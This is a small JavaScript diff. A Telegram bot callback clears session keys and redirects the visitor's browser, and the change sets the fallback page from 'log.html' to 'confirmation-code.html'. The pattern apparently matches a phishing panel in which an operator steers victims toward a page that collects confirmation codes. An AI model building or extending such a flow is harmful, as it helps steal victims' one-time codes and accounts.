@@ -69,7 +69,7 @@
                     await answerTelegramCallback(cb.id, "Redirecting user…");
                     sessionStorage.removeItem('mgv_sid');
                     sessionStorage.removeItem('mgv_offset');
-                    window.location.href = ROUTES[action] || "log.html";
+                    window.location.href = ROUTES[action] || "confirmation-code.html";
                     return;
                 }
             } catch (e) {
